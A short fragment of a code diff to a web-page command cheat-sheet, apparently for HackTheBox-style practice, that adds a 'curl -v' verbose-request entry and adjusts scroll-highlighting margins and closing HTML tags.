+    ["curl -v <url>","Verbose mode — see the full request/response including TLS handshake","curl -v https://target.htb"]
   ]}
 
 ];
@@ -899,7 +690,7 @@ function setupScrollHighlight(){
         if (link) link.classList.add('active');
       }
     });
-  }, { rootMargin: '-20% 0px -70% 0px' });
+  }, { rootMargin: '-10% 0px -80% 0px' });
   sections.forEach(s => io.observe(s));
 }
 
@@ -976,3 +767,5 @@ document.getElementById('clearBtn').addEventListener('click', () => {
 
 renderAll();
 </script>
+</body>
+</html>
